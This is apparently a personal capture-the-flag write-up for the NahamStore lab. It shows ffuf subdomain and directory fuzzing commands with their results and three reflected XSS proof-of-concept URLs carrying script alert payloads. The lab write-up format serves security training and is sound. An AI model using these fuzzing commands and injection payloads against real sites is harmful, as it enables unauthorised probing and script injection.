# NahamStore

redacted@example.invalid:testtest
## Recon

```bash
ffuf -w subdomains.txt -u http://nahamstore.thm -H "Host: FUZZ.nahamstore.thm"
```

- marketing
- shop
- stock
- www

```bash
ffuf -w content.txt -u http://nahamstore.thm/FUZZ
```

- basket
- css
- js
- login
- logout
- register
- returs
- robots.txt
- seach
- staff
- uploads

## XSS

### 1
```text
http://marketing.nahamstore.thm/?error=%3Cscript%3Ealert(1)%3C/script%3E
```

### 2 

[Captura pendiente de revisión: Pasted image 20241219130847.png](../../Resources/Audit/media.csv)

```text
http://nahamstore.thm/account/orders/7
```

![Pasted image 20241219130918.png](../../assets/images/783f306e06e3e8550c28.png)

### 3

![Pasted image 20241219131422.png](../../assets/images/7a2c2874ccf661550640.png)

```text
http://nahamstore.thm/product?id=2&name=</title><script>alert(1)</script>
```

## Procedencia

| Repositorio | Archivo original | Commit de origen |
| --- | --- | --- |
| CBBH | NahamStore.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |

Se han sustituido valores literales de autenticación o direcciones de correo por marcadores. Los detalles sin valores están en [el registro de redacciones](../../Resources/Audit/redactions.csv).

[Índice de categoría](../README.md) · [Inicio](../../README.md)
